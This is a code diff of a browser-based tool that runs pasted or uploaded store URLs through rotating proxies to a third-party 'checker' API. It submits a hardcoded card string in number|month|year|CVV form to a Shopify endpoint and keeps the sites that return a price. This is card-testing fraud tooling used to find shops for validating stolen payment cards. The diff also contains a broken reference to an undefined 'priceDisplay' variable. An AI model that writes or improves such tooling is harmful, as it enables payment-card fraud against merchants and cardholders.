@@ -1674,63 +1674,64 @@
         }
 
         // ===== RENDER SITES =====
-        function renderSites() {
-            if (state.sites.length === 0) {
-                els.siteList.innerHTML = '<div class="list-item" style="color:var(--text-dim);">No sites uploaded yet</div>';
-                els.liveSiteCount.textContent = '0';
-                return;
-            }
-            
-            let html = `
-                <div class="list-header">
-                    <span class="col-num">#</span>
-                    <span class="col-left">Site URL</span>
-                    <span class="col-right">
-                        <span class="h-status">Status</span>
-                        <span class="h-latency">Price</span>
-                        <span class="h-added">Added</span>
-                        <span class="h-actions"></span>
-                    </span>
-                </div>
-            `;
-            
-            state.sites.forEach((s, index) => {
-                let siteUrl = s;
-                let status = 'ALIVE';
-                let price = '0.00';
-                let added = new Date().toLocaleDateString();
-                
-                if (typeof s === 'object') {
-                    siteUrl = s.url || s;
-                    status = s.status || 'ALIVE';
-                    price = s.price || '0.00';
-                    added = s.added || new Date().toLocaleDateString();
-                }
-                
-                const statusClass = status === 'ALIVE' ? 'status-alive' : 'status-dead';
-                const displayUrl = siteUrl.length > 40 ? siteUrl.slice(0, 40) + '...' : siteUrl;
-                
-                html += `
-                    <div class="list-item-row">
-                        <span class="row-num">${index + 1}</span>
-                        <span class="row-left" title="${siteUrl}">${displayUrl}</span>
-                        <span class="row-right">
-                            <span class="r-status ${statusClass}">${status}</span>
-                            <span class="r-latency">$${price}</span>
-                            <span class="r-added">${added}</span>
-                            <span class="r-actions">
-                                <button class="btn-icon btn-retest" onclick="retestSite(${index})" title="Retest site">🔄</button>
-                                <button class="btn-icon btn-remove" onclick="removeSite(${index})" title="Remove site">❌</button>
-                            </span>
-                        </span>
-                    </div>
-                `;
-            });
-            
-            els.siteList.innerHTML = html;
-            els.liveSiteCount.textContent = state.sites.length;
+       function renderSites() {
+    if (state.sites.length === 0) {
+        els.siteList.innerHTML = '<div class="list-item" style="color:var(--text-dim);">No sites uploaded yet</div>';
+        els.liveSiteCount.textContent = '0';
+        return;
+    }
+    
+    let html = `
+        <div class="list-header">
+            <span class="col-num">#</span>
+            <span class="col-left">Site URL</span>
+            <span class="col-right">
+                <span class="h-status">Status</span>
+                <span class="h-latency">Price</span>
+                <span class="h-added">Added</span>
+                <span class="h-actions"></span>
+            </span>
+        </div>
+    `;
+    
+    state.sites.forEach((s, index) => {
+        let siteUrl = s;
+        let status = 'ALIVE';
+        let price = '0.00';
+        let added = new Date().toLocaleDateString();
+        
+        if (typeof s === 'object') {
+            siteUrl = s.url || s;
+            status = s.status || 'ALIVE';
+            price = s.price || '0.00';
+            added = s.added || new Date().toLocaleDateString();
         }
-
+        
+        // 🔥 Show price with $ sign
+        const priceDisplay = price !== '0.00' ? `$${price}` : 'No Price';
+        const statusClass = status === 'ALIVE' ? 'status-alive' : 'status-dead';
+        const displayUrl = siteUrl.length > 40 ? siteUrl.slice(0, 40) + '...' : siteUrl;
+        
+        html += `
+            <div class="list-item-row">
+                <span class="row-num">${index + 1}</span>
+                <span class="row-left" title="${siteUrl}">${displayUrl}</span>
+                <span class="row-right">
+                    <span class="r-status ${statusClass}">${status}</span>
+                    <span class="r-latency">${priceDisplay}</span>
+                    <span class="r-added">${added}</span>
+                    <span class="r-actions">
+                        <button class="btn-icon btn-retest" onclick="retestSite(${index})" title="Retest site">🔄</button>
+                        <button class="btn-icon btn-remove" onclick="removeSite(${index})" title="Remove site">❌</button>
+                    </span>
+                </span>
+            </div>
+        `;
+    });
+    
+    els.siteList.innerHTML = html;
+    els.liveSiteCount.textContent = state.sites.length;
+}
         // ===== RENDER PROXIES =====
         function renderProxies() {
             if (state.proxies.length === 0) {
@@ -2188,49 +2189,86 @@
         // TEST SITE WITH PRICE
         // ================================================================
         async function testSiteWithPrice(site, proxy) {
-            if (typeof site === 'object' && site !== null) {
-                site = site.url || site.toString();
+    if (typeof site === 'object' && site !== null) {
+        site = site.url || site.toString();
+    }
+    if (typeof site !== 'string') {
+        site = String(site);
+    }
+    
+    try {
+        if (!site.startsWith('http')) site = 'https://' + site;
+        
+        let proxyStr = proxy;
+        if (proxy) {
+            if (typeof proxy === 'object' && proxy !== null) {
+                proxyStr = proxy.proxy || proxy.toString();
             }
-            if (typeof site !== 'string') {
-                site = String(site);
+            if (typeof proxyStr !== 'string') {
+                proxyStr = String(proxyStr);
             }
-            
-            try {
-                if (!site.startsWith('http')) site = 'https://' + site;
-                
-                let proxyStr = proxy;
-                if (proxy) {
-                    if (typeof proxy === 'object' && proxy !== null) {
-                        proxyStr = proxy.proxy || proxy.toString();
-                    }
-                    if (typeof proxyStr !== 'string') {
-                        proxyStr = String(proxyStr);
-                    }
-                    const proxyParts = proxyStr.split(':');
-                    if (proxyParts.length === 4) {
-                        proxyStr = `${proxyParts[0]}:${proxyParts[1]}:${proxyParts[2]}:${proxyParts[3]}`;
-                    } else if (proxyParts.length === 2) {
-                        proxyStr = `${proxyParts[0]}:${proxyParts[1]}`;
-                    }
-                }
-                if (!proxyStr) proxyStr = CONFIG.DEFAULT_PROXY;
-                
-                const apiBase = CONFIG.API_SERVERS[Math.floor(Math.random() * CONFIG.API_SERVERS.length)];
-                const url = `${apiBase}/check?site=${site}&key=${CONFIG.CHECKER_API_KEY}&proxy=${encodeURIComponent(proxyStr)}`;
-                const response = await fetch(url, {
-                    headers: { 'User-Agent': CONFIG.ANDROID_UA, 'Accept': 'application/json' }
-                });
-                if (!response.ok) return { site: site, status: 'dead', price: 0 };
-                const raw = await response.json();
-                if (raw.valid === true) {
-                    const priceValue = getPriceFromResponse(raw);
-                    return { site: site, status: 'alive', price: priceValue };
-                } else if (raw.valid === false) {
-                    return { site: site, status: 'dead', price: 0 };
-                }
-                return { site: site, status: 'dead', price: 0 };
-            } catch { return { site: site, status: 'dead', price: 0 }; }
+            const proxyParts = proxyStr.split(':');
+            if (proxyParts.length === 4) {
+                proxyStr = `${proxyParts[0]}:${proxyParts[1]}:${proxyParts[2]}:${proxyParts[3]}`;
+            } else if (proxyParts.length === 2) {
+                proxyStr = `${proxyParts[0]}:${proxyParts[1]}`;
+            }
         }
+        if (!proxyStr) proxyStr = CONFIG.DEFAULT_PROXY;
+        
+        // 🔥 Use the test card that works
+        const testCard = '4031630422575208|01|2030|280';
+        const apiBase = CONFIG.API_SERVERS[Math.floor(Math.random() * CONFIG.API_SERVERS.length)];
+        const url = `${apiBase}/shopify?site=${site}&key=${CONFIG.CHECKER_API_KEY}&proxy=${encodeURIComponent(proxyStr)}&cc=${testCard}`;
+        
+        logDebug(`🔍 Testing site: ${site}`, 'info');
+        const response = await fetch(url, {
+            headers: { 'User-Agent': CONFIG.ANDROID_UA, 'Accept': 'application/json' }
+        });
+        
+        if (!response.ok) return { site: site, status: 'dead', price: 0 };
+        
+        const raw = await response.json();
+        logDebug(`📄 Site test response: ${JSON.stringify(raw).substring(0, 150)}`, 'raw');
+        
+        const responseMsg = raw.Response || raw.card_response || '';
+        const price = raw.Price || raw.price || 0;
+        const gateway = raw.Gate || raw.Gateway || raw.gate || '';
+        const priceValue = getPriceFromResponse(raw);
+        
+        // 🔥 CRITICAL: Check if site has products
+        if (priceValue > 0) {
+            logDebug(`✅ Site has products: $${priceValue}`, 'success');
+            return { site: site, status: 'alive', price: priceValue };
+        }
+        
+        // 🔥 Check for NO_PRODUCT responses
+        if (responseMsg.toLowerCase().includes('no_product') || 
+            responseMsg.toLowerCase().includes('no product')) {
+            logDebug(`❌ Site has NO PRODUCTS: ${site}`, 'error');
+            return { site: site, status: 'dead', price: 0 };
+        }
+        
+        // 🔥 Check if site is dead
+        if (isSiteDead(responseMsg, gateway, priceDisplay)) {
+            logDebug(`❌ Site is dead: ${site}`, 'error');
+            return { site: site, status: 'dead', price: 0 };
+        }
+        
+        // If we have a valid gateway but no price, still mark as dead
+        if (gateway && gateway !== 'Unknown' && gateway.includes('Shopify')) {
+            if (priceValue === 0) {
+                logDebug(`⚠️ Site has Shopify but NO PRODUCTS: ${site}`, 'warning');
+                return { site: site, status: 'dead', price: 0 };
+            }
+        }
+        
+        return { site: site, status: 'dead', price: 0 };
+    } catch (error) {
+        logDebug(`❌ Site test error for ${site}: ${error.message}`, 'error');
+        return { site: site, status: 'dead', price: 0 };
+    }
+}
 
         // ================================================================
         // PROGRESS FILTERS
@@ -2832,79 +2870,132 @@
             reader.readAsText(file);
         });
 
-        els.addManualSitesBtn.addEventListener('click', function() {
-            const text = els.manualSites.value;
-            if (!text.trim()) { alert('Please paste some sites'); return; }
-            const urls = text.split('\n').map(u => u.trim()).filter(u => u);
-            const newSites = urls.map(url => ({
+        // ================================================================
+// FIXED: ADD SITES WITH PRE-CHECK
+// ================================================================
+els.addManualSitesBtn.addEventListener('click', async function() {
+    const text = els.manualSites.value;
+    if (!text.trim()) { alert('Please paste some sites'); return; }
+    
+    const urls = text.split('\n').map(u => u.trim()).filter(u => u);
+    if (urls.length === 0) { alert('No valid sites found'); return; }
+    
+    if (state.proxies.length === 0) {
+        alert('❌ No proxies available! Please add proxies first.');
+        return;
+    }
+    
+    this.disabled = true;
+    this.textContent = '⏳ Checking sites...';
+    
+    let addedCount = 0;
+    let deadCount = 0;
+    let results = [];
+    
+    for (const url of urls) {
+        const proxy = state.proxies[Math.floor(Math.random() * state.proxies.length)];
+        const proxyStr = typeof proxy === 'object' ? proxy.proxy : proxy;
+        
+        // 🔥 CHECK SITE FIRST
+        const result = await testSiteWithPrice(url, proxyStr);
+        
+        if (result.status === 'alive' && result.price > 0) {
+            // ✅ Site has products and price - ADD IT
+            state.sites.push({
                 url: url,
                 status: 'ALIVE',
-                price: '0.00',
+                price: result.price.toFixed(2),
                 added: new Date().toLocaleDateString()
-            }));
-            state.sites = [...state.sites, ...newSites];
-            state.sites = [...new Map(state.sites.map(item => [item.url, item])).values()];
-            renderSites();
-            updateStats();
-            logDebug(`🌐 Added ${urls.length} manual sites`, 'info');
-            alert(`✅ ${urls.length} sites added! Total: ${state.sites.length}`);
-            els.manualSites.value = '';
-        });
+            });
+            addedCount++;
+            results.push(`✅ ${url} - $${result.price.toFixed(2)}`);
+            logDebug(`✅ Site ALIVE: ${url} - $${result.price.toFixed(2)}`, 'success');
+        } else {
+            // ❌ Site has NO PRODUCTS - DON'T ADD
+            deadCount++;
+            results.push(`❌ ${url} - NO PRODUCTS (DEAD)`);
+            logDebug(`❌ Site DEAD: ${url} - No products found`, 'error');
+        }
+    }
+    
+    // Remove duplicates after adding
+    state.sites = [...new Map(state.sites.map(item => [item.url, item])).values()];
+    
+    renderSites();
+    updateStats();
+    
+    this.disabled = false;
+    this.textContent = '➕ Add Sites';
+    els.manualSites.value = '';
+    
+    // Show results
+    const resultText = results.slice(0, 20).join('\n');
+    const more = results.length > 20 ? `\n...and ${results.length - 20} more` : '';
+    alert(`✅ Added: ${addedCount}\n❌ Dead (No Products): ${deadCount}\n\n${resultText}${more}`);
+});
 
-        els.checkSitesBtn.addEventListener('click', async function() {
-            if (state.sites.length === 0) { alert('No sites to check!'); return; }
-            if (state.proxies.length === 0) { alert('❌ No proxies available!'); return; }
-
-            this.disabled = true;
-            this.textContent = '⏳ Checking...';
-            els.siteCheckProgress.style.display = 'block';
-
-            const total = state.sites.length;
-            let checked = 0, alive = 0, dead = 0;
+// ================================================================
+// FIXED: UPLOAD SITES WITH PRE-CHECK
+// ================================================================
+els.uploadSitesBtn.addEventListener('click', function() {
+    const file = els.siteFileInput.files[0];
+    if (!file) { alert('Please select a .txt file'); return; }
+    
+    const reader = new FileReader();
+    reader.onload = async function(e) {
+        const urls = e.target.result.split('\n').map(u => u.trim()).filter(u => u);
+        if (urls.length === 0) { alert('No sites found in file'); return; }
+        
+        if (state.proxies.length === 0) {
+            alert('❌ No proxies available! Please add proxies first.');
+            return;
+        }
+        
+        els.uploadSitesBtn.disabled = true;
+        els.uploadSitesBtn.textContent = '⏳ Checking...';
+        
+        let addedCount = 0;
+        let deadCount = 0;
+        let results = [];
+        
+        for (const url of urls) {
+            const proxy = state.proxies[Math.floor(Math.random() * state.proxies.length)];
+            const proxyStr = typeof proxy === 'object' ? proxy.proxy : proxy;
             
-            for (let i = state.sites.length - 1; i >= 0; i--) {
-                const site = state.sites[i];
-                const siteUrl = typeof site === 'object' ? site.url : site;
-                const proxy = state.proxies[Math.floor(Math.random() * state.proxies.length)];
-                const result = await testSiteWithPrice(siteUrl, proxy);
-                
-                checked++;
-                
-                if (result.status === 'alive') {
-                    alive++;
-                } else {
-                    dead++;
-                    state.sites.splice(i, 1);
-                    renderSites();
-                    updateStats();
-                }
-                
-                const pct = Math.round((checked / total) * 100);
-                els.siteCheckStatus.textContent = pct + '%';
-                els.siteCheckFill.style.width = pct + '%';
-                els.siteCheckChecked.textContent = checked;
-                els.siteCheckAlive.textContent = alive;
-                els.siteCheckDead.textContent = dead;
-                els.siteCheckTotal.textContent = total;
-                await new Promise(r => setTimeout(r, 30));
+            // 🔥 CHECK SITE FIRST
+            const result = await testSiteWithPrice(url, proxyStr);
+            
+            if (result.status === 'alive' && result.price > 0) {
+                state.sites.push({
+                    url: url,
+                    status: 'ALIVE',
+                    price: result.price.toFixed(2),
+                    added: new Date().toLocaleDateString()
+                });
+                addedCount++;
+                results.push(`✅ ${url} - $${result.price.toFixed(2)}`);
+                logDebug(`✅ Site ALIVE: ${url} - $${result.price.toFixed(2)}`, 'success');
+            } else {
+                deadCount++;
+                results.push(`❌ ${url} - NO PRODUCTS (DEAD)`);
+                logDebug(`❌ Site DEAD: ${url} - No products found`, 'error');
             }
-
-            renderSites();
-            updateStats();
-
-            els.siteCheckStatus.textContent = '✅ Complete!';
-            els.siteCheckFill.style.width = '100%';
-            setTimeout(() => {
-                els.siteCheckProgress.style.display = 'none';
-                els.siteCheckStatus.textContent = '0%';
-                els.siteCheckFill.style.width = '0%';
-            }, 3000);
-
-            this.disabled = false;
-            this.textContent = '🔍 Check & Remove Dead';
-            logDebug(`✅ Site check: ${alive} alive, ${dead} removed from original list`, 'success');
-            alert(`✅ Done! ${alive} sites alive, ${dead} removed from your list.`);
-        });
+        }
+        
+        state.sites = [...new Map(state.sites.map(item => [item.url, item])).values()];
+        renderSites();
+        updateStats();
+        
+        els.uploadSitesBtn.disabled = false;
+        els.uploadSitesBtn.textContent = 'Upload File';
+        els.siteFileInput.value = '';
+        
+        const resultText = results.slice(0, 20).join('\n');
+        const more = results.length > 20 ? `\n...and ${results.length - 20} more` : '';
+        alert(`✅ Added: ${addedCount}\n❌ Dead (No Products): ${deadCount}\n\n${resultText}${more}`);
+    };
+    reader.readAsText(file);
+});
 
         els.clearSitesBtn.addEventListener('click', function() {
             if (state.sites.length === 0) { alert('No sites to clear'); return; }
